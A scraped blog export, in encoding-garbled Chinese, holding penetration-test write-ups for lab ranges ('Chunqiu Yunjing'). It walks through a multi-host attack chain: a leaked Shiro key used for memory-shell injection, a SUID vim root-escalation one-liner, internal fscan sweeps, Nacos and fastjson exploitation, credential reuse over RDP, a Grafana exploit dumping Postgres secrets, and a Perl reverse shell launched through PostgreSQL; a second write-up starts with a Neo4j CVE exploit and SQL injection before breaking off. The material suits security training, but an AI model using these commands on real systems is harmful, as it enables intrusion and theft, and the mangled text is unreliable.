sun.,com.sun.xml.internal.,com.sun.imageio.,com.sun.istack.internal.,com.sun.jmx.,com.sun.media.sound.,com.sun.naming.internal.,com.sun.proxy.,com.sun.corba.se.,com.sun.org.apache.bcel.internal.,com.sun.org.apache.regexp.internal.,com.sun.org.apache.xerces.internal.,com.sun.org.apache.xpath.internal.,com.sun.org.apache.xalan.internal.extensions.,com.sun.org.apache.xalan.internal.lib.,com.sun.org.apache.xalan.internal.res.,com.sun.org.apache.xalan.internal.templates.,com.sun.org.apache.xalan.internal.utils.,com.sun.org.apache.xalan.internal.xslt.,com.sun.org.apache.xalan.internal.xsltc.cmdline.,com.sun.org.apache.xalan.internal.xsltc.compiler.,com.sun.org.apache.xalan.internal.xsltc.trax.,com.sun.org.apache.xalan.internal.xsltc.util.,com.sun.org.apache.xml.internal.res.,com.sun.org.apache.xml.internal.resolver.helpers.,com.sun.org.apache.xml.internal.resolver.readers.,com.sun.org.apache.xml.internal.security.,com.sun.org.apache.xml.internal.serializer.utils.,com.sun.org.apache.xml.internal.utils.,com.sun.org.glassfish.,com.oracle.xmlns.internal.,com.oracle.webservices.internal.,oracle.jrockit.jfr.,org.jcp.xml.dsig.internal.,jdk.internal.,jdk.nashorn.internal.,jdk.nashorn.tools.,jdk.xml.internal.,com.sun.activation.registries.,jdk.jfr.events.,jdk.jfr.internal.,jdk.management.jfr.internal.sun.boot.class.path = /usr/lib/jvm/java-8-openjdk-amd64/jre/lib/resources.jar:/usr/lib/jvm/java-8-openjdk-amd64/jre/lib/rt.jar:/usr/lib/jvm/java-8-openjdk-amd64/jre/lib/sunrsasign.jar:/usr/lib/jvm/java-8-openjdk-amd64/jre/lib/jsse.jar:/usr/lib/jvm/java-8-openjdk-amd64/jre/lib/jce.jar:/usr/lib/jvm/java-8-openjdk-amd64/jre/lib/charsets.jar:/usr/lib/jvm/java-8-openjdk-amd64/jre/lib/jfr.jar:/usr/lib/jvm/java-8-openjdk-amd64/jre/classesjava.protocol.handler.pkgs = org.springframework.boot.loadersun.management.compiler = HotSpot 64-Bit Tiered Compilersorg.springframework.web.servlet.ThemeResolver = org.springframework.web.servlet.theme.FixedThemeResolverjava.runtime.version = 1.8.0_392-8u392-ga-1~20.04-b08user.name = apppolicy.url.1 = file:$&#123;java.home&#125;/lib/security/java.policysecurerandom.source = file:/dev/randompolicy.url.2 = file:$&#123;user.home&#125;/.java.policyjdk.tls.disabledAlgorithms = SSLv3, TLSv1, TLSv1.1, RC4, DES, MD5withRSA, DH keySize &lt; 1024, EC keySize &lt; 224, 3DES_EDE_CBC, anon, NULL, include jdk.disabled.namedCurvespolicy.ignoreIdentityScope = falsefile.encoding = UTF-8java.util.logging.ConsoleHandler.formatter = java.util.logging.SimpleFormatterjdk.sasl.disabledMechanisms =java.io.tmpdir = /tmporg.springframework.web.servlet.ViewResolver = org.springframework.web.servlet.view.InternalResourceViewResolverjava.version = 1.8.0_392java.vm.specification.name = Java Virtual Machine Specificationjdk.tls.keyLimits = AES/GCM/NoPadding KeyUpdate 2^37PID = 750java.awt.printerjob = sun.print.PSPrinterJobjdk.xml.dsig.secureValidationPolicy = disallowAlg http://www.w3.org/TR/1999/REC-xslt-19991116,disallowAlg http://www.w3.org/2001/04/xmldsig-more#rsa-md5,disallowAlg http://www.w3.org/2001/04/xmldsig-more#hmac-md5,disallowAlg http://www.w3.org/2001/04/xmldsig-more#md5,maxTransforms 5,maxReferences 30,disallowReferenceUriSchemes file http https,minKeySize RSA 1024,minKeySize DSA 1024,minKeySize EC 224,noDuplicateIds,noRetrievalMethodLoopsjava.library.path = /usr/java/packages/lib/amd64:/usr/lib/x86_64-linux-gnu/jni:/lib/x86_64-linux-gnu:/usr/lib/x86_64-linux-gnu:/usr/lib/jni:/lib:/usr/libjava.vendor = Private Buildjava.specification.maintenance.version = 5handlers = java.util.logging.ConsoleHandlersun.io.unicode.encoding = UnicodeLittlekrb5.kdc.bad.policy = tryLastjava.class.path = /app/login-1.0-SNAPSHOT.jarjava.vm.vendor = Private Buildjdk.security.legacyAlgorithms = SHA1, RSA keySize &lt; 2048, DSA keySize &lt; 2048jdk.disabled.namedCurves = secp112r1, secp112r2, secp128r1, secp128r2, secp160k1, secp160r1, secp160r2, secp192k1, secp192r1, secp224k1, secp224r1, secp256k1, sect113r1, sect113r2, sect131r1, sect131r2, sect163k1, sect163r1, sect163r2, sect193r1, sect193r2, sect233k1, sect233r1, sect239k1, sect283k1, sect283r1, sect409k1, sect409r1, sect571k1, sect571r1, X9.62 c2tnb191v1, X9.62 c2tnb191v2, X9.62 c2tnb191v3, X9.62 c2tnb239v1, X9.62 c2tnb239v2, X9.62 c2tnb239v3, X9.62 c2tnb359v1, X9.62 c2tnb431r1, X9.62 prime192v2, X9.62 prime192v3, X9.62 prime239v1, X9.62 prime239v2, X9.62 prime239v3, brainpoolP256r1, brainpoolP320r1, brainpoolP384r1, brainpoolP512r1crypto.policy = unlimitedjceks.key.serialFilter = java.lang.Enum;java.security.KeyRep;java.security.KeyRep$Type;javax.crypto.spec.SecretKeySpec;!*login.configuration.provider = sun.security.provider.ConfigFileuser.timezone =java.vm.specification.version = 1.8os.name = Linuxuser.country = USjdk.security.caDistrustPolicies = SYMANTEC_TLSsun.cpu.endian = littleuser.home = /home/appuser.language = enen = UTF-8jdk.tls.alpnCharset = ISO_8859_1ssl.KeyManagerFactory.algorithm = SunX509.level = INFOjava.awt.graphicsenv = sun.awt.X11GraphicsEnvironmentjava.awt.headless = truecom.xyz.foo.level = SEVEREpolicy.provider = sun.security.provider.PolicyFilepath.separator = :fr = UTF-8os.version = 5.4.0-164-genericjava.endorsed.dirs = /usr/lib/jvm/java-8-openjdk-amd64/jre/lib/endorsedjava.runtime.name = OpenJDK Runtime Environmentkeystore.type.compat = trueorg.springframework.web.servlet.RequestToViewNameTranslator = org.springframework.web.servlet.view.DefaultRequestToViewNameTranslatorspring.beaninfo.ignore = truejava.vm.name = OpenJDK 64-Bit Server VMjava.vendor.url.bug = http://bugreport.sun.com/bugreport/java.util.logging.FileHandler.formatter = java.util.logging.XMLFormatterjava.util.logging.FileHandler.count = 1catalina.home = /tmp/tomcat.5978727065775558529.8080sun.cds.enableSharedLookupCache = falsesun.security.krb5.maxReferrals = 5catalina.base = /tmp/tomcat.5978727065775558529.8080java.util.logging.FileHandler.limit = 50000java.vm.info = mixed modekeystore.type = jksjava.ext.dirs = /usr/lib/jvm/java-8-openjdk-amd64/jre/lib/ext:/usr/java/packages/lib/extpolicy.expandProperties = truesecurerandom.strongAlgorithms = NativePRNGBlocking:SUN===========================================ProcessEnvironment-------------not found!===========================================OSS-------------not found!===========================================UserPassSearcher-------------org.apache.shiro.web.filter.authc.FormAuthenticationFilter:[failureKeyAttribute = shiroLoginFailure, loginUrl = /login, successUrl = /, usernameParam = username, passwordParam = password]org.apache.catalina.startup.Tomcat:[hostname = localhost]===========================================CookieThief-------------not found!===========================================AuthThief-------------not found!=========================================== æœ‰ä¸€ä¸ªshirokey 1algMode = CBC, key = GAYysgMQhG7/CzIJlVpR2g==, algName = AES ç”¨shiroå·¥å…·æ³¨å…¥å†…å­˜é©¬,å†°èè¿æ¥å³å¯ vim.basicå­˜åœ¨suidæƒé™ 1234567891011121314151617181920app@web01:~$ find / -perm -u=s -type f 2&gt;/dev/nullfind / -perm -u=s -type f 2&gt;/dev/null/usr/bin/vim.basic/usr/bin/su/usr/bin/newgrp/usr/bin/staprun/usr/bin/at/usr/bin/passwd/usr/bin/gpasswd/usr/bin/umount/usr/bin/chfn/usr/bin/stapbpf/usr/bin/sudo/usr/bin/chsh/usr/bin/fusermount/usr/bin/mount/usr/lib/openssh/ssh-keysign/usr/lib/dbus-1.0/dbus-daemon-launch-helper/usr/lib/eject/dmcrypt-get-device ç³»ç»Ÿå­˜åœ¨python3ç¯å¢ƒï¼Œ å‚è€ƒhttps://gtfobins.github.io/gtfobins/vim/ ææƒï¼Œflag01åœ¨/root/flagä¸‹ 1/usr/bin/vim.basic -c &#x27;:python3 import os; os.execl(&quot;/bin/sh&quot;, &quot;sh&quot;, &quot;-pc&quot;, &quot;reset; exec sh -p&quot;)&#x27; flag02ç„¶åæ­å»ºä¸€ä¸ªä»£ç†éš§é“ï¼Œä¸Šä¼ ä¸€ä¸ªfscanå¼€å§‹æ‰«æ 1234567891011121314151617181920212223242526272829303132333435363738394041424344454647484950515253545556575859606162636465666768697071727374757677787980818283848586ip a 1: lo: &lt;LOOPBACK,UP,LOWER_UP&gt; mtu 65536 qdisc noqueue state UNKNOWN group default qlen 1000 link/loopback 00:00:00:00:00:00 brd 00:00:00:00:00:00 inet 127.0.0.1/8 scope host lo valid_lft forever preferred_lft forever inet6 ::1/128 scope host valid_lft forever preferred_lft forever2: eth0: &lt;BROADCAST,MULTICAST,UP,LOWER_UP&gt; mtu 1500 qdisc mq state UP group default qlen 1000 link/ether 00:16:3e:0d:aa:83 brd ff:ff:ff:ff:ff:ff inet 172.30.12.5/16 brd 172.30.255.255 scope global dynamic eth0 valid_lft 315357949sec preferred_lft 315357949sec inet6 fe80::216:3eff:fe0d:aa83/64 scope link valid_lft forever preferred_lft forever ./fscan -h 172.30.12.1/24â”Œâ”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”â”‚ ___ _ â”‚â”‚ / _ \\ ___ ___ _ __ __ _ ___| | __ â”‚â”‚ / /_\\/____/ __|/ __| &#x27;__/ _` |/ __| |/ / â”‚â”‚ / /_\\\\_____\\__ \\ (__| | | (_| | (__| &lt; â”‚â”‚ \\____/ |___/\\___|_| \\__,_|\\___|_|\\_\\ â”‚â””â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”˜ Fscan Version: 2.0.0[2025-04-10 17:23:09] [INFO] æš´åŠ›ç ´è§£çº¿ç¨‹æ•°: 1[2025-04-10 17:23:09] [INFO] å¼€å§‹ä¿¡æ¯æ‰«æ[2025-04-10 17:23:09] [INFO] CIDRèŒƒå›´: 172.30.12.0-172.30.12.255[2025-04-10 17:23:10] [INFO] ç”ŸæˆIPèŒƒå›´: 172.30.12.0.%!d(string=172.30.12.255) - %!s(MISSING).%!d(MISSING)[2025-04-10 17:23:10] [INFO] è§£æCIDR 172.30.12.1/24 -&gt; IPèŒƒå›´ 172.30.12.0-172.30.12.255[2025-04-10 17:23:10] [INFO] æœ€ç»ˆæœ‰æ•ˆä¸»æœºæ•°é‡: 256[2025-04-10 17:23:10] [INFO] å¼€å§‹ä¸»æœºæ‰«æ[2025-04-10 17:23:10] [SUCCESS] ç›®æ ‡ 172.30.12.5 å­˜æ´» (ICMP)[2025-04-10 17:23:10] [SUCCESS] ç›®æ ‡ 172.30.12.6 å­˜æ´» (ICMP)[2025-04-10 17:23:10] [SUCCESS] ç›®æ ‡ 172.30.12.236 å­˜æ´» (ICMP)[2025-04-10 17:23:13] [INFO] å­˜æ´»ä¸»æœºæ•°é‡: 3[2025-04-10 17:23:13] [INFO] æœ‰æ•ˆç«¯å£æ•°é‡: 233[2025-04-10 17:23:13] [SUCCESS] ç«¯å£å¼€æ”¾ 172.30.12.236:22[2025-04-10 17:23:13] [SUCCESS] ç«¯å£å¼€æ”¾ 172.30.12.6:445[2025-04-10 17:23:13] [SUCCESS] ç«¯å£å¼€æ”¾ 172.30.12.6:139[2025-04-10 17:23:13] [SUCCESS] ç«¯å£å¼€æ”¾ 172.30.12.6:135[2025-04-10 17:23:13] [SUCCESS] ç«¯å£å¼€æ”¾ 172.30.12.5:22[2025-04-10 17:23:13] [SUCCESS] ç«¯å£å¼€æ”¾ 172.30.12.236:8009[2025-04-10 17:23:13] [SUCCESS] ç«¯å£å¼€æ”¾ 172.30.12.5:8080[2025-04-10 17:23:13] [SUCCESS] ç«¯å£å¼€æ”¾ 172.30.12.236:8080[2025-04-10 17:23:13] [SUCCESS] æœåŠ¡è¯†åˆ« 172.30.12.236:22 =&gt; [ssh] ç‰ˆæœ¬:8.2p1 Ubuntu 4ubuntu0.9 äº§å“:OpenSSH ç³»ç»Ÿ:Linux ä¿¡æ¯:Ubuntu Linux; protocol 2.0 Banner:[SSH-2.0-OpenSSH_8.2p1 Ubuntu-4ubuntu0.9.][2025-04-10 17:23:13] [SUCCESS] æœåŠ¡è¯†åˆ« 172.30.12.5:22 =&gt; [ssh] ç‰ˆæœ¬:8.2p1 Ubuntu 4ubuntu0.9 äº§å“:OpenSSH ç³»ç»Ÿ:Linux ä¿¡æ¯:Ubuntu Linux; protocol 2.0 Banner:[SSH-2.0-OpenSSH_8.2p1 Ubuntu-4ubuntu0.9.][2025-04-10 17:23:13] [SUCCESS] ç«¯å£å¼€æ”¾ 172.30.12.6:8848[2025-04-10 17:23:18] [SUCCESS] æœåŠ¡è¯†åˆ« 172.30.12.6:445 =&gt; [2025-04-10 17:23:18] [SUCCESS] æœåŠ¡è¯†åˆ« 172.30.12.6:139 =&gt; Banner:[.][2025-04-10 17:23:18] [SUCCESS] æœåŠ¡è¯†åˆ« 172.30.12.236:8009 =&gt; [2025-04-10 17:23:18] [SUCCESS] æœåŠ¡è¯†åˆ« 172.30.12.5:8080 =&gt; [http][2025-04-10 17:23:19] [SUCCESS] æœåŠ¡è¯†åˆ« 172.30.12.236:8080 =&gt; [http][2025-04-10 17:23:24] [SUCCESS] æœåŠ¡è¯†åˆ« 172.30.12.6:8848 =&gt; [http][2025-04-10 17:24:18] [SUCCESS] æœåŠ¡è¯†åˆ« 172.30.12.6:135 =&gt; [2025-04-10 17:24:18] [INFO] å­˜æ´»ç«¯å£æ•°é‡: 9[2025-04-10 17:24:18] [INFO] å¼€å§‹æ¼æ´æ‰«æ[2025-04-10 17:24:18] [INFO] åŠ è½½çš„æ’ä»¶: findnet, ms17010, netbios, smb, smb2, smbghost, ssh, webpoc, webtitle[2025-04-10 17:24:18] [SUCCESS] NetBios 172.30.12.6 WORKGROUP\\SERVER02 [2025-04-10 17:24:18] [SUCCESS] NetInfo æ‰«æç»“æœç›®æ ‡ä¸»æœº: 172.30.12.6ä¸»æœºå: Server02å‘ç°çš„ç½‘ç»œæ¥å£: IPv4åœ°å€: â””â”€ 172.30.12.6[2025-04-10 17:24:18] [SUCCESS] ç½‘ç«™æ ‡é¢˜ http://172.30.12.5:8080 çŠ¶æ€ç :302 é•¿åº¦:0 æ ‡é¢˜:æ— æ ‡é¢˜ é‡å®šå‘åœ°å€: http://172.30.12.5:8080/login;jsessionid=BD7C602596372F417AEEB44C6651A392[2025-04-10 17:24:18] [SUCCESS] ç½‘ç«™æ ‡é¢˜ http://172.30.12.236:8080 çŠ¶æ€ç :200 é•¿åº¦:3964 æ ‡é¢˜:åŒ»é™¢åå°ç®¡ç†å¹³å°[2025-04-10 17:24:19] [SUCCESS] ç½‘ç«™æ ‡é¢˜ http://172.30.12.5:8080/login;jsessionid=BD7C602596372F417AEEB44C6651A392 çŠ¶æ€ç :200 é•¿åº¦:2005 æ ‡é¢˜:åŒ»ç–—ç®¡ç†åå°[2025-04-10 17:24:19] [SUCCESS] ç½‘ç«™æ ‡é¢˜ http://172.30.12.6:8848 çŠ¶æ€ç :404 é•¿åº¦:431 æ ‡é¢˜:HTTP Status 404 â€“ Not Found[2025-04-10 17:24:20] [SUCCESS] ç›®æ ‡: http://172.30.12.5:8080 æ¼æ´ç±»å‹: poc-yaml-spring-actuator-heapdump-file æ¼æ´åç§°: è¯¦ç»†ä¿¡æ¯: author:AgeloVito links:https://www.cnblogs.com/wyb628/p/8567610.html[2025-04-10 17:24:20] [SUCCESS] ç›®æ ‡: http://172.30.12.6:8848 æ¼æ´ç±»å‹: poc-yaml-alibaba-nacos æ¼æ´åç§°: è¯¦ç»†ä¿¡æ¯: author:AgeloVito links:https://blog.csdn.net/caiqiiqi/article/details/112005424[2025-04-10 17:24:21] [SUCCESS] ç›®æ ‡: http://172.30.12.6:8848 æ¼æ´ç±»å‹: poc-yaml-alibaba-nacos-v1-auth-bypass æ¼æ´åç§°: è¯¦ç»†ä¿¡æ¯: author:kmahyyg(https://github.com/kmahyyg) links:https://github.com/alibaba/nacos/issues/4593 æ‰«åˆ°äº†ä¸€ä¸ªnacosï¼Œé‚£å°±ä»è¿™é‡Œå…¥æ‰‹ï¼Œå¼±å£ä»¤nacos/nacosç™»å½•,è¿™ä¸ªæ¡†æ¶è¿˜å­˜åœ¨yamlååºåˆ—åŒ–æ¼æ´ åœ¨172.30.12.5ä¸Šé¢æ”¾ä¸Šæ¶æ„çš„jaræ–‡ä»¶ï¼Œç„¶åå¼€å¯ä¸€ä¸ªwebæœåŠ¡ï¼Œå†ç”¨åˆ©ç”¨å·¥å…·å»æ‰§è¡Œ 12345678910â”Œâ”€â”€(rootã‰¿kali)-[~/Desktop/tmp]â””â”€# nxc rdp 172.30.12.6 -u lv -p Asd123132. --local-auth[proxychains] DLL init: proxychains-ng 4.17[proxychains] Strict chain ... 192.168.11.1:9999 ... 172.30.12.6:3389 ... OK[proxychains] Strict chain ... 192.168.11.1:9999 ... 172.30.12.6:3389 ... OK[proxychains] Strict chain ... 192.168.11.1:9999 ... 172.30.12.6:3389 ... OK[proxychains] Strict chain ... 192.168.11.1:9999 ... 172.30.12.6:3389 ... OKRDP 172.30.12.6 3389 Server02 [*] Windows 10 or Windows Server 2016 Build 17763 (name:Server02) (domain:Server02) (nla:True)[proxychains] Strict chain ... 192.168.11.1:9999 ... 172.30.12.6:3389 ... OKRDP 172.30.12.6 3389 Server02 [+] Server02\\lv:Asd123132. (Pwn3d!) ç”¨æˆ·æ·»åŠ æˆåŠŸäº†ï¼ŒæŒ‚ä¸Šä»£ç†ï¼Œè¿œç¨‹æ¡Œé¢è¿æ¥ï¼Œflag02åœ¨C:\\Users\\Administrator\\flagä¸‹ flag03172.30.12.236ä¸»æœºå¼€æ”¾äº†8009ç«¯å£ï¼Œç™»å½•å£ä¼ å…¥çš„æ•°æ®ä¸º JSON æ ¼å¼ã€‚æ¢æµ‹ fastjson ç‰ˆæœ¬ payloadï¼š&#123;&quot;@type&quot;: &quot;java.lang.AutoCloseable&quot; https://raw.githubusercontent.com/h0ny/repo/main/images/2ed229594166743d.png) ç”¨bpçš„æ’ä»¶æ³¨å…¥å†…å­˜é©¬,å“¥æ–¯æ‹‰è¿æ¥ï¼Œflag03åœ¨/root/flag/ä¸‹ flag04è¿™ä¸ªé¶æœºè¿˜æœ‰ç¬¬äºŒå¼ ç½‘å¡ 1234567891011121314151617181920/ &gt;ip a1: lo: &lt;LOOPBACK,UP,LOWER_UP&gt; mtu 65536 qdisc noqueue state UNKNOWN group default qlen 1000 link/loopback 00:00:00:00:00:00 brd 00:00:00:00:00:00 inet 127.0.0.1/8 scope host lo valid_lft forever preferred_lft forever inet6 ::1/128 scope host valid_lft forever preferred_lft forever2: eth0: &lt;BROADCAST,MULTICAST,UP,LOWER_UP&gt; mtu 1500 qdisc mq state UP group default qlen 1000 link/ether 00:16:3e:0d:aa:e2 brd ff:ff:ff:ff:ff:ff inet 172.30.12.236/16 brd 172.30.255.255 scope global dynamic eth0 valid_lft 315354333sec preferred_lft 315354333sec inet6 fe80::216:3eff:fe0d:aae2/64 scope link valid_lft forever preferred_lft forever3: eth1: &lt;BROADCAST,MULTICAST,UP,LOWER_UP&gt; mtu 1500 qdisc mq state UP group default qlen 1000 link/ether 00:16:3e:0d:aa:92 brd ff:ff:ff:ff:ff:ff inet 172.30.54.179/24 brd 172.30.54.255 scope global eth1 valid_lft forever preferred_lft forever inet6 fe80::216:3eff:fe0d:aa92/64 scope link valid_lft forever preferred_lft forever ä¸Šä¼ ä¸€ä¸ªfscanï¼Œç„¶åæ‰«ä¸€ä¸‹ï¼Œåœ°å€ä¸º172.30.54.12ï¼Œéœ€è¦äºŒå±‚å†…ç½‘ä»£ç†ï¼Œè¿™å°æœºå™¨ä¸Šæœ‰grafana+postgresä¸¤ä¸ªæœåŠ¡ï¼Œgrafanaå­˜åœ¨å¼±å£ä»¤admin/adminç™»å½•,åœ¨web3çš„æœºå™¨ä¸Šä¸Šä¼ ä¸€ä¸ªexp,å¯ä»¥è·‘åˆ°postgresçš„å¯†ç  123452024/07/04 12:20:59 Target vulnerable has plugin [alertlist]2024/07/04 12:20:59 Got secret_key [SW2YcwTIb9zpOOhoPsMm]2024/07/04 12:20:59 There is [0] records in db.2024/07/04 12:20:59 type:[postgres] name:[PostgreSQL] url:[localhost:5432] user:[postgres] password[Postgres@123] database:[postgres] basic_auth_user:[] basic_auth_password:[]2024/07/04 12:20:59 All Done, have nice day! psql -h 172.30.54.12 -p 5432 -U postgresè¿æ¥,æŸ¥è¯¢rootçš„å¯†ç select usename, passwd from pg_shadow; 12345postgres=# select usename, passwd from pg_shadow; usename | passwd----------+------------------------------------- root | md5da974531914a7c2c56df745574a5bd3a postgres | md5dd27d33705155fd675e498384ad3d2ea çˆ†ç ´å‡ºæ¥æ˜¯P@ssw0rd123,åœ¨web03çš„æœºå™¨ä¸Šç›‘å¬ä¸€ä¸ªç«¯å£ï¼Œç„¶åç”¨perlåå¼¹ä¸€ä¸ªshell 1select system(&#x27;perl -e \\&#x27;use Socket;$i=&quot;172.30.54.179&quot;;$p=2333;socket(S,PF_INET,SOCK_STREAM,getprotobyname(&quot;tcp&quot;));if(connect(S,sockaddr_in($p,inet_aton($i))))&#123;open(STDIN,&quot;&gt;&amp;S&quot;);open(STDOUT,&quot;&gt;&amp;S&quot;);open(STDERR,&quot;&gt;&amp;S&quot;);exec(&quot;/bin/sh -i&quot;);&#125;;\\&#x27;&#x27;); ç„¶åpsqlææƒï¼Œflag04åœ¨/root/flag/ä¸‹","categories":[{"name":"æ˜¥ç§‹äº‘é•œ","slug":"æ˜¥ç§‹äº‘é•œ","permalink":"https://lvzhouhang.xyz/categories/%E6%98%A5%E7%A7%8B%E4%BA%91%E9%95%9C/"}],"tags":[{"name":"é¶æœº","slug":"é¶æœº","permalink":"https://lvzhouhang.xyz/tags/%E9%9D%B6%E6%9C%BA/"}]},{"title":"æ˜¥ç§‹äº‘é•œ-Time","slug":"æ˜¥ç§‹äº‘é•œ-Time","date":"2025-04-08T16:08:14.000Z","updated":"2025-04-19T13:26:00.230Z","comments":true,"path":"2025/04/09/æ˜¥ç§‹äº‘é•œ-Time/","permalink":"https://lvzhouhang.xyz/2025/04/09/%E6%98%A5%E7%A7%8B%E4%BA%91%E9%95%9C-Time/","excerpt":"","text":"FLAG1é¦–å…ˆç”¨fscanè¿›è¡Œä¿¡æ¯æœé›† 1234567891011121314151617181920212223242526â”Œâ”€â”€(rootã‰¿kali)-[~/Desktop/tmp]â””â”€# ../pentest/fscan/fscan2 -h 39.98.117.163 -p 1-65535â”Œâ”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”â”‚ ___ _ â”‚â”‚ / _ \\ ___ ___ _ __ __ _ ___| | __ â”‚â”‚ / /_\\/____/ __|/ __| &#x27;__/ _` |/ __| |/ / â”‚â”‚ / /_\\\\_____\\__ \\ (__| | | (_| | (__| &lt; â”‚â”‚ \\____/ |___/\\___|_| \\__,_|\\___|_|\\_\\ â”‚â””â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”˜ Fscan Version: 2.0.0[2025-04-08 12:36:27] [INFO] æš´åŠ›ç ´è§£çº¿ç¨‹æ•°: 1[2025-04-08 12:36:27] [INFO] å¼€å§‹ä¿¡æ¯æ‰«æ[2025-04-08 12:36:27] [INFO] æœ€ç»ˆæœ‰æ•ˆä¸»æœºæ•°é‡: 1[2025-04-08 12:36:27] [INFO] å¼€å§‹ä¸»æœºæ‰«æ[2025-04-08 12:36:27] [INFO] æœ‰æ•ˆç«¯å£æ•°é‡: 65535[2025-04-08 12:36:27] [SUCCESS] ç«¯å£å¼€æ”¾ 39.98.117.163:22[2025-04-08 12:36:28] [SUCCESS] æœåŠ¡è¯†åˆ« 39.98.117.163:22 =&gt; [ssh] ç‰ˆæœ¬:8.2p1 Ubuntu 4ubuntu0.5 äº§å“:OpenSSH ç³»ç»Ÿ:Linux ä¿¡æ¯:Ubuntu Linux; protocol 2.0 Banner:[SSH-2.0-OpenSSH_8.2p1 Ubuntu-4ubuntu0.5.][2025-04-08 12:37:17] [SUCCESS] ç«¯å£å¼€æ”¾ 39.98.117.163:1337[2025-04-08 12:37:27] [SUCCESS] æœåŠ¡è¯†åˆ« 39.98.117.163:1337 =&gt;[2025-04-08 12:41:00] [SUCCESS] ç«¯å£å¼€æ”¾ 39.98.117.163:7473[2025-04-08 12:41:01] [SUCCESS] ç«¯å£å¼€æ”¾ 39.98.117.163:7474[2025-04-08 12:41:08] [SUCCESS] ç«¯å£å¼€æ”¾ 39.98.117.163:7687[2025-04-08 12:41:11] [SUCCESS] æœåŠ¡è¯†åˆ« 39.98.117.163:7473 =&gt; Banner:[.P][2025-04-08 12:41:11] [SUCCESS] æœåŠ¡è¯†åˆ« 39.98.117.163:7474 =&gt; [http][2025-04-08 12:41:18] [SUCCESS] æœåŠ¡è¯†åˆ« 39.98.117.163:7687 =&gt; fscanæ‰«æé¶æœºï¼Œæœ‰1337ã€7473ã€7474ã€7687ç«¯å£ï¼Œ7474ç«¯å£æ˜¯neo4jï¼Œé»˜è®¤å¯†ç neo4j:neo4j(å¯ä»¥ç™»å½•ï¼Œä½†æ˜¯æ²¡ä»€ä¹ˆç”¨)ï¼Œè¿˜æœ‰ä¸€ä¸ªCVE-2021-34371ï¼Œå¯ä»¥ç›´æ¥ä¸€æŠŠæ¢­å“ˆhttps://github.com/zwjjustdoit/CVE-2021-34371.jarï¼Œåå¼¹ä¸€ä¸ªshell flag01åœ¨neo4jçš„ç›®å½•ä¸‹ FLAG2ç„¶åä¸Šä¼ ä¸€ä¸ªfscanæ‰«æå†…ç½‘ï¼ˆä¼šå‡ºæ¥æ²¡æ‰«æå‡ºæ¥çš„æƒ…å†µï¼Œéœ€è¦å¤šæ‰«æå‡ æ¬¡ï¼‰ 123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657neo4j@ubuntu:~$ ./fscan -h 172.22.6.36/20./fscan -h 172.22.6.36/20 ___ _ / _ \\ ___ ___ _ __ __ _ ___| | __ / /_\\/____/ __|/ __| &#x27;__/ _` |/ __| |/ // /_\\\\_____\\__ \\ (__| | | (_| | (__| &lt; \\____/ |___/\\___|_| \\__,_|\\___|_|\\_\\ fscan version: 1.8.4start infoscantrying RunIcmp2The current user permissions unable to send icmp packetsstart ping(icmp) Target 172.22.6.25 is alive(icmp) Target 172.22.6.36 is alive(icmp) Target 172.22.6.38 is alive[*] LiveTop 172.22.0.0/16 æ®µå­˜æ´»æ•°é‡ä¸º: 3[*] LiveTop 172.22.6.0/24 æ®µå­˜æ´»æ•°é‡ä¸º: 3[*] Icmp alive hosts len is: 3172.22.6.36:22 open172.22.6.25:445 open172.22.6.25:139 open172.22.6.25:135 open172.22.6.38:80 open172.22.6.38:22 open172.22.6.36:7687 open172.22.6.25:445 open172.22.6.12:445 open172.22.6.12:139 open172.22.6.25:139 open172.22.6.25:135 open172.22.6.12:135 open172.22.6.12:88 openstart vulscan[*] NetInfo [*]172.22.6.25 [-&gt;]WIN2019 [-&gt;]172.22.6.25[*] NetInfo [*]172.22.6.12 [-&gt;]DC-PROGAME [-&gt;]172.22.6.12[*] NetBios 172.22.6.25 XIAORANG\\WIN2019 [*] OsInfo 172.22.6.12 (Windows Server 2016 Datacenter 14393)[*] NetBios 172.22.6.12 [+] DC:DC-PROGAME.xiaorang.lab Windows Server 2016 Datacenter 14393[*]172.22.6.25 [-&gt;]WIN2019 [-&gt;]172.22.6.25[*] NetBios 172.22.6.25 XIAORANG\\WIN2019 [*] WebTitle http://172.22.6.38 code:200 len:1531 title:åå°ç™»å½•[*] WebTitle https://172.22.6.36:7687 code:400 len:50 title:Noneå·²å®Œæˆ 7/7[*] æ‰«æç»“æŸ,è€—æ—¶: 1m36.67936002s 172.22.6.38æ˜¯ä¸€ä¸ªwebæœåŠ¡ ï¼Œç”¨ä¸‡èƒ½å¯†ç å¯ä»¥ç™»å½•æˆåŠŸå­˜åœ¨sqlæ³¨å…¥ï¼Œä½†æ˜¯ä¸ä¼šè·³è½¬ï¼Œç”¨sqlmapè·‘ä¸€ä¸‹ flag02åœ¨æ•°æ®åº“é‡Œï¼Œå°†oa_db.oa_usersçš„emailæå‡ºï¼Œå¤„ç†ä¸€ä¸‹å°†ç”¨æˆ·åæå–å‡ºæ¥ 123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263646566676869707172737475767778798081828384858687888990919293949596979899100101102103104105106107108109110111112113114115116117118119120121122123124125126127128129130131132133134135136137138139140141142143144145146147148149150151152153154155156157158159160161162163164165166167168169170171172173174175176177178179180181182183184185186187188189190191192193194195196197198199200201202203204205206207208209210211212213214215216217218219220221222223224225226227228229230231232233234235236237238239240241242243244245246247248249250251252253254255256257258259260261â”Œâ”€â”€(rootã‰¿kali)-[~/Desktop/tmp]â””â”€# cat 1|grep -E 